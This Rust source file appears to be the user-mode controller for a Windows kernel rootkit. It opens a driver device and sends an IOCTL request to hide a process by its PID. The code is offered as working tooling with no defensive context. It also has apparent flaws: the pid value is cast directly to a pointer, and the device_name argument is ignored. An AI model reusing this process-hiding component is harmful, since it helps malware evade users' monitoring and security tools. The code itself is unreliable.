use std::ffi::c_void;

use crate::constants::IOCTL_PROCESS_HIDE_REQUEST;

use windows::core::w;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Storage::FileSystem::CreateFileW;
use windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES;
use windows::Win32::Storage::FileSystem::{CREATE_ALWAYS, OPEN_EXISTING};
use windows::Win32::Storage::FileSystem::{
    FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
};
use windows::Win32::System::IO::DeviceIoControl;


pub unsafe fn contact_driver(device_name:&str) -> HANDLE {
    let device_name = w!("\\\\.\\MyDevice");
    let handle = CreateFileW(
        device_name,
        FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES(0),
        HANDLE(0 as *mut c_void),
    );

    match handle {
        Ok(handle) => {
            println!("Handle: {:?}", handle);
            handle
        }
        Err(error) => {
            println!("Error: {:?}", error);
            HANDLE(0 as *mut c_void)
        }
    }
}

pub unsafe fn hide_process(driver_handle: HANDLE, pid: u32) {
    let pid_ptr: *mut c_void = pid as *mut c_void;
    let pid_size = std::mem::size_of::<u32>() as u32;
    let result = DeviceIoControl(
        driver_handle,
        IOCTL_PROCESS_HIDE_REQUEST,
        Some(pid_ptr),
        pid_size,
        None,
        0,
        None,
        None,
    );

    match result {
        Ok(_) => {
            println!("Success");
        }
        Err(error) => {
            println!("Error: {:?}", error);
        }
    }
}
